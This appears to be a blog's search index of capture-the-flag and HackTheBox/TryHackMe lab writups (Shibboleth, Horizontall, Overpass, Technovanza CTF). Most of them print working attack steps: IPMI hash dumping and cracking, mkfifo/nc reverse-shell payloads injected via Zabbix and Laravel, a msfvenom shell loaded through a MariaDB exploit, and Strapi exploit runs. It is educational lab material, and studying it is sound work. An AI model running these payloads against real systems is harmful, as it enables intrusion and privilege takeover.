&amp;lt;pid&amp;gt;.&amp;lt;tty&amp;gt;.&amp;lt;host&amp;gt;.-t title Set title. (window&#39;s name).-T term Use term as $TERM for windows, rather than &quot;screen&quot;.-U Tell screen to use UTF-8 encoding.-v Print &quot;Screen version 4.08.00 (GNU) 05-Feb-20&quot;.-wipe [match] Do nothing, just clean up SockDir [on possible matches].-x Attach to a not detached screen. (Multi display mode).-X Execute &amp;lt;cmd&amp;gt; as a screen command in the specified session. So as there were no exploits available on the internet we have to play with the flags I tried to exploit with help of GTFO bins and some flags around here So we can get root shell with the -x flag : -x UserYouWannaHijackSession / HisSessionNamerootuser@Backdoor:~$ /usr/bin/screen -x root/root/usr/bin/screen -x root/rootroot@Backdoor:~# ididuid=0(root) gid=0(root) groups=0(root)root@Backdoor:~# cat /root/root.txt&amp;lt;--SNIPPED--&amp;gt; If you didn’t get the shell or some error like Please set a terminal type. use this command export TERM=xtermBox pwned" }, { "title": "Hackthebox Shibboleth Writeup", "url": "/posts/Shibboleth/", "categories": "htb", "tags": "htb", "date": "2022-04-09 01:30:00 +0530", "snippet": "Machine name - Shibboleth ( HackTheBox )Nmap Scan└─$ nmap -p- -sC -sV shibboleth.htbStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 09:37 ISTNmap scan report for shibboleth.htb (10.129.99.116)Host is up (0.20s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: FlexStart Bootstrap Template - IndexService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Hmmm only 1 port is opened, strange, Let’s try scanning UDP ports└─$ nmap -vvv -T4 -sU shibboleth.htbIncreasing send delay for 10.129.98.77 from 0 to 50 due to 11 out of 17 dropped probes since last increase.Warning: 10.129.98.77 giving up on port because retransmission cap hit (6).Increasing send delay for 10.129.98.77 from 200 to 400 due to 11 out of 14 dropped probes since last increase.Increasing send delay for 10.129.98.77 from 400 to 800 due to 11 out of 11 dropped probes since last increase.Nmap scan report for shibboleth.htb (10.129.98.77)Host is up, received echo-reply ttl 63 (0.21s latency).Scanned at 2021-11-14 00:50:23 EST for 1076sNot shown: 993 closed portsReason: 993 port-unreachesPORT STATE SERVICE REASON623/udp open asf-rmcp udp-response ttl 635555/udp open|filtered rplay no-response8000/udp open|filtered irdmi no-response21167/udp open|filtered unknown no-response30718/udp open|filtered unknown no-response49175/udp open|filtered unknown no-response49350/udp open|filtered unknown no-responseRead data files from: /usr/bin/../share/nmap# Nmap done at Sun Nov 14 01:08:19 2021 -- 1 IP address (1 host up) scanned in 1075.67 seconds…………and yess there are some udp ports openDirectory Scanning________________________________________________ :: Method : GET :: URL : http://zabbix.shibboleth.htb/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 286, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 286, Words: 20, Lines: 10]app [Status: 301, Size: 328, Words: 20, Lines: 10]assets [Status: 301, Size: 331, Words: 20, Lines: 10]audio [Status: 301, Size: 330, Words: 20, Lines: 10]conf [Status: 301, Size: 329, Words: 20, Lines: 10]favicon.ico [Status: 200, Size: 32988, Words: 13, Lines: 3]fonts [Status: 301, Size: 330, Words: 20, Lines: 10]include [Status: 301, Size: 332, Words: 20, Lines: 10]js [Status: 301, Size: 327, Words: 20, Lines: 10]local [Status: 301, Size: 330, Words: 20, Lines: 10]locale [Status: 301, Size: 331, Words: 20, Lines: 10]modules [Status: 301, Size: 332, Words: 20, Lines: 10]robots.txt [Status: 200, Size: 974, Words: 153, Lines: 23]server-status [Status: 403, Size: 286, Words: 20, Lines: 10]vendor [Status: 301, Size: 331, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 328 req/sec :: Duration: [0:01:06] :: Errors: 0 ::After enumerating through these directories I found nothing that was intresting, let’s try getting some subdomainsSubdomain List└─$ ffuf -w /usr/share/wordlists/subdomains/subdomain-1million.txt -u http://shibboleth.htb/ -H &quot;Host: FUZZ.shibboleth.htb&quot; -mc 200 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/wordlists/subdomains/subdomain-1million.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200________________________________________________monitor [Status: 200, Size: 3686, Words: 192, Lines: 30]monitoring [Status: 200, Size: 3686, Words: 192, Lines: 30]zabbix [Status: 200, Size: 3686, Words: 192, Lines: 30]Voila!! we have some subdomains active , let’s add them to /etc/hosts└─$ sudo nano /etc/hosts#htb machines10.129.99.116 shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htbAll the three subdomain had a login pageHmmmmmm zabbix Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumptionGet login detailsSo I tried with some Web Attacks to login but none of them worked, The UDP port 623 will get us some hashesLearn The UDP port 623 is vulnerable : https://book.hacktricks.xyz/pentesting/623-udp-ipmiLogin creds I’ve used the Metasplot way to get the hashes because it was easymsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; use auxiliary/scanner/ipmi/ipmi_dumphashesmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; set rhosts 10.129.99.116rhosts =&amp;gt; 10.129.99.116msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; set OUTPUT_JOHN_FILE zabbixloginOUTPUT_JOHN_FILE =&amp;gt; zabbixloginmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; exploit[+] 10.129.99.116:623 - IPMI - Hash found: Administrator:97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:84568da58ac1bb73a12d71bb0ea9d08a470ebd31[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &amp;gt; cat zabbixlogin[*] exec: cat zabbixlogin10.129.99.116 Administrator:$rakp$97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$84568da58ac1bb73a12d71bb0ea9d08a470ebd31 John cracked the password└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zabbixlogin Using default input encoding: UTF-8Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])Will run 4 OpenMP threadsPress &#39;q&#39; or Ctrl-C to abort, almost any other key for statusilovepumkinpie1 (10.129.99.116 Administrator)1g 0:00:00:02 DONE (2021-11-15 10:10) 0.4201g/s 3139Kp/s 3139Kc/s 3139KC/s in_199..iargxeUse the &quot;--show&quot; option to display all of the cracked passwords reliablySession completed└─$ john zabbixlogin --show 10.129.99.116 Administrator:ilovepumkinpie11 password hash cracked, 0 left So now we have the creds [ Administrator : ilovepumkinpie1 ]Initial Foothold I researched for a bit and found this intresting https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents After moving around the website I figured out that ` add items ` was vulnerable The payload system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f sh -i 2&amp;gt;&amp;amp;1 nc 10.10.10.10 9999 &amp;gt;/tmp/f &amp;amp;,nowait] Set up a nc listener and get the shell└─$ nc -nvlp 9002listening on [any] 9002 ...connect to [10.10.14.47] from (UNKNOWN) [10.129.99.116] 40614sh: 0: can&#39;t access tty; job control turned off$ whoami zabbix As there were no SSH ports open we don’t get any stabalize shell, let’s get work with this shellGet User flag / escalting user privileges# Use the zabbix login creds to get ipmi-svc userzabbix@shibboleth$ su ipmi-svcpassword : ilovepumkinpie1ipmi-svc@shibboleth$ cat /home/ipmi-svc/user.txt&amp;lt;--SNIP--&amp;gt; Escalating privileges [ root ]linpeas.shroot 1279 0.0 0.0 2608 1856 ? S Nov13 0:00 /bin/sh /usr/bin/mysqld_saferoot 1431 0.7 3.7 1727148 150636 ? Sl Nov13 6:13 _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock Hmmm, MySQL is running as root, let’s enumerate So the DB information was stored in /etc/zabbix/zabbix_server.conf ipmi-svc@shibboleth:/etc$ cat /etc/zabbix/zabbix_server.conf | grep -C 2 -i &quot;password&quot;&amp;lt;zabbix/zabbix_server.conf | grep -C 2 -i &quot;password&quot;DBUser=zabbix### Option: DBPassword# Database password.# Comment this line if no password is used.## Mandatory: no# Default:DBPassword=bloooarskybluh Now we have the username and password [ zabbix : bloooarskybluh ]MySQL enumeration As ipmi-svc user was not in the sudoers list GTFO bins is not helpfulipmi-svc@shibboleth:/etc$ mysql -Vmysql -Vmysql Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2 So the version is : 10.3.25 Link : https://www.cvedetails.com/vulnerability-list/vendor_id-12010/Mariadb.html The first CVE has 9.0 score [ CVE-2021-27928 ] Let’s get the root Link : https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.htmlFinal Step Create the reverse shell payload msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT= -f elf-so -o root.so I’ve used python http server and wget to download the payload python3 -m http.server 80 [ Attacker ] wget http:///root.so [ Victim ] Setup a nc listener # Login with creds we got earlier ipmi-svc@shibboleth:~$ mysql -u zabbix -pbloooarskybluh -h localhost -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/root.so&quot;;&#39;&amp;lt;host -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/root.so&quot;;&#39;ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query## Rooted the machine └─$ nc -nvlp 4433 listening on [any] 4433 ...connect to [10.10.14.47] from (UNKNOWN) [10.129.99.153] 49958python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;root@shibboleth:/var/lib/mysql#iduid=0(root) gid=0(root) groups=0(root) root@shibboleth:/var/lib/mysql# cat /root/root.txt&amp;lt;--SNIP--&amp;gt;Box pwned" }, { "title": "Technovanza CTF 2022", "url": "/posts/Technovanza/", "categories": "ctf", "tags": "ctf", "date": "2022-02-20 16:30:00 +0530", "snippet": "Technovanza CTF WriteupChallengesD3vel0peRFile Given was a image I tried many steg tools but found nothing intresting Read the description, said the web develope has somthing for you The flag was in source code of the website ``Flagflag : TECHNO(lOv3_T3chn0vANZa)FutureFile It’s a cipher https://www.dcode.fr/futurama-alien-alphabetFlag : TECHNO(we_are_not_alone)aquamanDescriptionIt was a long time ago when Aquaman had a small feast, but his friends refused to agree. He lost the photo; his friends want him to tell the date and time of when they ate. Aquaman roughly remembers the month and year to be knjwamujkkvbivznqjmpeye can u help him find the complete date and time. Flag Format: TECHNO(yyyy-mm-dd_hh-mm-ss)SOlve See instagram They had lunch on sept 2018 Used osintgram to find exact time#flag : TECHNO(2018-09-27_19-14-46)can you find the difference?FileSOlve Used strings to get the flag# Flag : TECHNO(vjti_campus_I5_b34u7iFul)Jumping Jack Was just bunch of base64 and base32 encryptedSolve╰─ echo &quot;KMYUURCWNRLFKUZRMRHVI23YI5JTCWSUKJVXAS2SGBKTAVLLJZGFIRKKJRJGWMKYKUYDKS2WNRNFSU2WJZKFI2ZVKNKGWVS2KZVU4V2UGBFE6UTLNN4U22SKJNIWW6CIKZ5FMRCVKV2FGUSFLJDFK6SKKRKGYSSLKJVXIVKUIUYUUU3LLJDVCVSWJNHFK2CWKBKDAOKQKQYDS===&quot; | base32 -d | base64 -d | base32 -d | base64 -d | base32 -d | base64 -dadMin_S4yS_&quot;1Ol&quot;# Flag : TECHNO(adMin_S4yS_&quot;1Ol&quot;)malwar3 Given was a .docx file After i opened it…. it had PK which is initial bytes used to describe .zip files Rename└─$ mv malwar3.docx mal.zip##########################└─$ unzip mal.zipArchive: mal.zip inflating: [Content_Types].xml inflating: documentProps/app.xml inflating: documentProps/core.xml creating: word/_rels/ inflating: word/_rels/document.xml.rels inflating: word/file.xml inflating: word/font.xml inflating: word/settings.xml inflating: word/styleSettings.xml creating: word/theme/ inflating: word/theme/theme1.xml inflating: word/webSettings.xml SOlve Last line of word/file.xml had some characters &amp;lt;,s[-1i?Yl:24?-&amp;lt;+SG--&amp;gt; It was encoded with Ascii85 Flag# TECHNO(Tr0j4n_INjeCTeD)landlord why u like dis? Extract all the flies using : sudo unsquashfs -f -d &amp;lt;directory-you-want-to-extract&amp;gt; &amp;lt;filename&amp;gt; Find key and cipher text Cipher text ╰─$ cat ciphertxt.enc OuWrlAKbKZjfRw11VWv81kq40ZHemgJKR39be3vVn9JodbKTGczpZPITPLWAJvDrv96rq46/BnPgY/+3S0SlbRUWFBZvsxwk6FcEKwsyT+Kr/0ng5Jx0sPKkMqSgHisTzyZoCUv3pfUYP587TXBaQz2MSSNIxWJ4fUkbjlbKXas={but where is the key?} Private key ╰─$ cat private.key-----prIv473_Key-----MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALtdcbD3walQVFxgTd8uAxgVarRPtgTHTI7CDnAHVUvvYzDRyZcE31vagVG3StncJiqc8Nv2yTYRTh5qFLg3192BL3W5vo6Qc7DqHQxja+/21sAnbpQng7zc9yvH4fh6LLQA/rDS14hrk01PJH96S+cghlbYXPqL/ygrbuTm7pchAgMBAAECgYEAn8Dp+lEVT88NTwJSA1QREUzZgUph0Ss5TJOLidvGz4saUPre3qQp6gChuNIGwUEjTbwo5fRC1ZXlvKsIZZY/t8c16yolslJ6TdxHVjwI/i4vVpYy/PKwCw2VTpL+3pW/4rv8KPHgiAl4B4+tLJxAIB74TDwuwLNmHD3H9kgLNN0CQQDzHS9n0ZmjszwaGdCPkAvL6G42bMeOBViiwRrMAKFVBDnbYSVIVZCeblYwHW7Bf0BGzn7rlqsz+XrRrmID0mUfAkEAxUvM+orA+x2vTLhUy0pzk4B/Xzsrpl4GjyzCzVrVpYGlWEkOetQFGwNOYOYt4njuThPNsnoxFDJNCbASvHk7vwJBAIiJwKEXJ6m3tS6XhvnKFcX8kUGB0IWj3QbzWyBtzi4YRIJAShcY7zL7lu5I6XZFCI171e5sXVTAbckrniK1XFMCQQCeqPGDPdgpWVriyI2wGgRNxxUnIS9eD9kYhHd3qyeKfHLaR430atJcQdFjDVgy+usxMK3HbIpRYo4fT1AR7zCDAkAGdSuElZW+RVR82U+ulz9f1yfl0DrYWsFeWQ4P5RO8x8Dtl+FMv/GTpJlRawNdgGq1BYcJgWJjHNdYh19UFQNz-----end---- There was some error in key https://www.samltool.com/format_privatekey.php repairs the key Final private key╰─$ cat private.key-----BEGIN RSA PRIVATE KEY-----MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALtdcbD3walQVFxgTd8uAxgVarRPtgTHTI7CDnAHVUvvYzDRyZcE31vagVG3StncJiqc8Nv2yTYRTh5qFLg3192BL3W5vo6Qc7DqHQxja+/21sAnbpQng7zc9yvH4fh6LLQA/rDS14hrk01PJH96S+cghlbYXPqL/ygrbuTm7pchAgMBAAECgYEAn8Dp+lEVT88NTwJSA1QREUzZgUph0Ss5TJOLidvGz4saUPre3qQp6gChuNIGwUEjTbwo5fRC1ZXlvKsIZZY/t8c16yolslJ6TdxHVjwI/i4vVpYy/PKwCw2VTpL+3pW/4rv8KPHgiAl4B4+tLJxAIB74TDwuwLNmHD3H9kgLNN0CQQDzHS9n0ZmjszwaGdCPkAvL6G42bMeOBViiwRrMAKFVBDnbYSVIVZCeblYwHW7Bf0BGzn7rlqsz+XrRrmID0mUfAkEAxUvM+orA+x2vTLhUy0pzk4B/Xzsrpl4GjyzCzVrVpYGlWEkOetQFGwNOYOYt4njuThPNsnoxFDJNCbASvHk7vwJBAIiJwKEXJ6m3tS6XhvnKFcX8kUGB0IWj3QbzWyBtzi4YRIJAShcY7zL7lu5I6XZFCI171e5sXVTAbckrniK1XFMCQQCeqPGDPdgpWVriyI2wGgRNxxUnIS9eD9kYhHd3qyeKfHLaR430atJcQdFjDVgy+usxMK3HbIpRYo4fT1AR7zCDAkAGdSuElZW+RVR82U+ulz9f1yfl0DrYWsFeWQ4P5RO8x8Dtl+FMv/GTpJlRawNdgGq1BYcJgWJjHNdYh19UFQNz-----END RSA PRIVATE KEY-----Solve Used openssl to solve the RSA└─$ openssl rsautl -decrypt -inkey private.key -in ciphertxt.enc b1NwA1K_15_u5eFu1 Flag# Flag : TECHNO(b1NwA1K_15_u5eFu1)" }, { "title": "HackTheBox Horizontall Writeup", "url": "/posts/horizonall_htb/", "categories": "htb", "tags": "htb", "date": "2022-02-06 00:00:00 +0530", "snippet": "WriteupDifficulty : EasyPort Scan 2 ports were open in this machine : 22, 80└─$ nmap -p 22,80 -sC -sV horizontall.htb Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-27 19:43 ISTNmap scan report for horizontall.htb (10.10.11.105)Host is up (0.16s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)| 256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)|_ 256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: horizontallService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 14.73 secondsSubdomain There were no intresting directories for the website so I moved to find the subdomain One of the js files had the subdomain which saved a lot of time in scanning Js file link : http://horizontall.htb/js/app.c68eb462.js&amp;lt;--SNIPPED--&amp;gt; {var t=this;r.a.get(&quot;http://api-prod.horizontall.htb/reviews&quot;).then((function(s) &amp;lt;--SNIPPED--&amp;gt; Subdomain found : api-prod.horizontall.htb ( Add the subdomain in /etc/hosts )Directories└─$ feroxbuster -u http://api-prod.horizontall.htb/ -w /usr/share/wordlists/dirb/big.txt 1 ⨯ ___ ___ __ __ __ __ __ ___|__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__| |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___by Ben &quot;epi&quot; Risher ver: 2.4.0───────────────────────────┬────────────────────── Target Url │ http://api-prod.horizontall.htb/ Threads │ 50 Wordlist │ /usr/share/wordlists/dirb/big.txt Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] Timeout (secs) │ 7 User-Agent │ feroxbuster/2.4.0 Config File │ /etc/feroxbuster/ferox-config.toml Recursion Depth │ 4 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™──────────────────────────────────────────────────200 16l 101w 854c http://api-prod.horizontall.htb/Admin200 16l 101w 854c http://api-prod.horizontall.htb/ADMIN200 16l 101w 854c http://api-prod.horizontall.htb/admin200 1l 7w 1150c http://api-prod.horizontall.htb/favicon.ico200 1l 21w 507c http://api-prod.horizontall.htb/reviews200 3l 21w 121c http://api-prod.horizontall.htb/robots.txt403 1l 1w 60c http://api-prod.horizontall.htb/users[####################] - 1m 20468/20468 0s found:7 errors:0 [####################] - 1m 20468/20468 219/s http://api-prod.horizontall.htb/web Exploitation Alright, so among all the directories , the /admin was userful It uses starpi cms What’s Starpi ? Strapi is an open-source headless CMS used for building fast and easily manageable APIs written in JavaScript. It enables developers to make flexible API structures easily using a beautiful user interface. Strapi can be used with various databases including MongoDB, PostgreSQL, etc. Starpi Version I didn’t found anything on the website that tells us the starpi version So, I used feroxbuster again, to find sub directoires. I found an intresting directory that gaves the starpi version used in the server ( http://api-prod.horizontall.htb/admin/init )└─$ curl http://api-prod.horizontall.htb/admin/init{&quot;data&quot;:{&quot;uuid&quot;:&quot;a55da3bd-9693-4a08-9279-f9df57fd1817&quot;,&quot;currentEnvironment&quot;:&quot;development&quot;,&quot;autoReload&quot;:false,&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;}} starpi verison is : 3.0.0-beta.17.4Exploit Public exploit link : https://www.exploit-db.com/exploits/50239 Download or copy the exploit to get login details Login details :└─$ python3 exploit.py http://api-prod.horizontall.htb 1 ⨯[+] Checking Strapi CMS Version running[+] Seems like the exploit will work!!![+] Executing exploit[+] Password reset was successfully[+] Your email is: admin@horizontall.htb[+] Your new credentials are: admin:SuperStrongPassword1[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzMjk1MDQ3LCJleHAiOjE2NDU4ODcwNDd9.FxVxaCiduAAdIqnIHvmox5o330ARzD1-Z7DPAPjxYdg Login details : [ admin:SuperStrongPassword1 ]User Shell Exploit link for RCE : https://github.com/diego-tella/CVE-2019-19609-EXPLOIT# TERMINAL 1 :# Setup a listener before using the exploit └─$ nc -nvlp 4444 1 ⨯listening on [any] 4444 ...# TERMINAL 2 :└─$ python3 rce.py -d api-prod.horizontall.htb -jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQzMjk1NzczLCJleHAiOjE2NDU4ODc3NzN9.4aUFn0Cx5J5hpjbtY-RxS5TNPVjG101BMeGnY22XrCQ -l &amp;lt;YOUR_IP&amp;gt; -p 4444 We got the user shellUser flagstrapi@horizontall:/home$ cat /home/developer/user.txtcat /home/developer/user.txt8e051bdafc84f_&amp;lt;--SNIPPED--&amp;gt;Enumeration There were some ports open listening on localhoststrapi@horizontall:/tmp$ netstat -anetstat -aActive Internet connections (servers and established)Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 localhost:8000 0.0.0.0:* LISTEN tcp 0 0 localhost:mysql 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:http 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:ssh 0.0.0.0:* LISTEN tcp 0 0 localhost:1337 0.0.0.0:* LISTEN tcp 0 0 localhost:40620 localhost:1337 TIME_WAIT &amp;lt;--SNIPPED--&amp;gt; Enumerate port 8000strapi@horizontall:/tmp$ curl http://localhost:8000curl http://localhost:8000&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt; &amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt; &amp;lt;--SNIPPED--&amp;gt; &amp;lt;div class=&quot;ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0&quot;&amp;gt; Laravel v8 (PHP v7.4.18) &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt; Vulnerable application : Laravel v8 (PHP v7.4.18)SSH port forwading We have the permission to write in /opt/strapistrapi@horizontall:~$ ls -la /opt/strapils -la /opt/strapitotal 52drwxr-xr-x 10 strapi strapi 4096 Jan 27 10:13 .drwxr-xr-x 3 root root 4096 May 26 2021 ..-rw-r--r-- 1 strapi strapi 231 Jun 1 2021 .bash_logout-rw-r--r-- 1 strapi strapi 3810 Jun 1 2021 .bashrcdrwx------ 2 strapi strapi 4096 May 26 2021 .cachedrwx------ 3 strapi strapi 4096 May 26 2021 .configdrwx------ 4 strapi strapi 4096 Jan 27 11:26 .gnupgdrwxrwxr-x 3 strapi strapi 4096 Jun 1 2021 .localdrwxr-xr-x 9 strapi strapi 4096 Jan 27 10:57 myapidrwxrwxr-x 5 strapi strapi 4096 Jan 27 14:51 .npmdrwxrwxr-x 5 strapi strapi 4096 Jan 27 05:24 .pm2-rw-r--r-- 1 strapi strapi 807 Apr 4 2018 .profiledrwxrwxr-x 2 strapi strapi 4096 Jan 27 10:16 .ssh We will add our .pub file in the machine to get a shell and for port forwardRequired Files for port forward SSH keys use ssh-keygen -t rsa to create 2 files id_rsa and authorized keys Learn more about port forwarding : https://phoenixnap.com/kb/ssh-port-forwarding Rename the .pub file to authorized_keys and the other file to id_rsa Download the authorized_keys in the machine in /opt/strapi/.ssh I’ve used python3 server└─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.105 - - [27/Jan/2022 21:42:04] &quot;GET /authorized_keys HTTP/1.1&quot; 200 - wget it in the machinestrapi@horizontall:~/.ssh$ wget http://&amp;lt;YOUR_IP&amp;gt;/authorized_keyswget http://&amp;lt;YOUR_IP&amp;gt;/authorized_keys--2022-01-27 16:11:20-- http://&amp;lt;YOUR_IP&amp;gt;/authorized_keysConnecting to &amp;lt;YOUR_IP&amp;gt;:80... connected.HTTP request sent, awaiting response... 200 OKLength: 568 [application/vnd.exstream-package]Saving to: ‘authorized_keys’auhtorized_keys 100%[===================&amp;gt;] 568 --.-KB/s in 0s 2022-01-27 16:11:21 (27.9 MB/s) - ‘authorized_keys’ saved [568/568]strapi@horizontall:~/.ssh$ lslsauthorized_keysstrapi@horizontall:~/.ssh$ cat *cat *ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCJ5TFuWgJ5SOHci9qv7oU0NtYB/7L/2h2+LZGHreS6MgNx1ydjwvYwSzFHB2tUAWHlNJajMqSP/K+DQrTIkrnQwwxKRvJW55ECH/40bkM9xiyutmMJi1WmQ8onKJG1EcvCr3vZc3dZVVbFORwTxbf/B0Ftdx1Uysr2+Q5EBBjKjR41NK8oAaiYItG6tvpyMcBvwG4U3RkFSPbZ4RCC5LvyqCp6rhWJcxgtmH6ssgMj0bC9ZLSVg56QTy2iq0Jqa0Jpq5F/eM35so/kPIySf/EfSARZjHBToC9oeEPLvqAP8h2d1DLiPBSnCl5OyvXafBaw0SQ7uTCedAHnOHXP6Wkqw4A0zu3peVO8m4eMajtSQjelUtlQSOnVR7FriJmMQsYXA9AP3ULHtxgNXRnoUxXGqM8hUJmpA5iw90Ns7PbmD4liD0DRSLKwnOHXffoZkqG/pqAU/+htA1OGonrzijDcWcibLzvd3SZIgDq2+3pdHYBQXyEBUq0+fGvdM5stTs=Root Shell Homepage of the application running on port 8000 Exploit used to get root priviliges : https://github.com/nth347/CVE-2021-3129_exploit└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 whoami[i] Trying to clear logs[+] Logs cleared[+] PHPGGC found. Generating payload and deploy it to the target[+] Successfully converted logs to PHAR[+] PHAR deserialized. Exploitedroot[i] Trying to clear logs[+] Logs clearedRoot Flag└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 &quot;cat /root/root.txt&quot; 1 ⨯[i] Trying to clear logs[+] Logs cleared[+] PHPGGC found. Generating payload and deploy it to the target[+] Successfully converted logs to PHAR[+] PHAR deserialized. Exploitededaf3a8f9_&amp;lt;--SNIPPED--&amp;gt;[i] Trying to clear logs[+] Logs clearedRoot Shell Open nc connection on any port└─$ python3 root.py http://127.0.0.1:8000 Monolog/RCE1 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc &amp;lt;YOUR_IP&amp;gt; &amp;lt;PORT&amp;gt; &amp;gt;/tmp/f&quot;[i] Trying to clear logs[+] Logs cleared[+] PHPGGC found. Generating payload and deploy it to the target[+] Successfully converted logs to PHAR[i] There is no output Root shell└─$ nc -nvlp 6666 listening on [any] 6666 ...connect to [&amp;lt;YOUR_IP_WOULD_BE_HERE&amp;gt;] from (UNKNOWN) [10.10.11.105] 34418sh: 0: can&#39;t access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)" }, { "title": "TryHackMe Overpass Walkthrough", "url": "/posts/Overpass/", "categories": "thm", "tags": "thm", "date": "2022-01-31 18:40:00 +0530", "snippet": "Overpass WriteupFrom TryhackmePort ScanDirectory ScanWeb Exploitation After seeing all the directories, /admin was most intresting to me Looking at the source code I found some intresting .js files login.js This piece of code has an vulnerability, it checks the response of the browser and if it doesn’t incorrect credentials,it redirect us to the /admin pageget admin privilege Intercept login request with burp suite and change the response to get admin panel Right click on the reques and &amp;gt; Do intercept &amp;gt; Request to this response This is the respose we get Updated response Admin homepageUser Shell we got username from admin panel, I’ve used john to crack the ssh password We successfully got a shellRoot shell I’ve used python server to get linpeas into the machine We have permission to write in /etc/hosts There’s a cronjob running on root service which basicallay uses curl and pipe it into bash We are going to change the content of /etc/hosts , adding our ip as overpass.thm First create files in your localhost Add a payload in buildscript.sh└─$ cat downloads/src/buildscript.sh #!/bin/bashrm /tmp/f;mkfifo 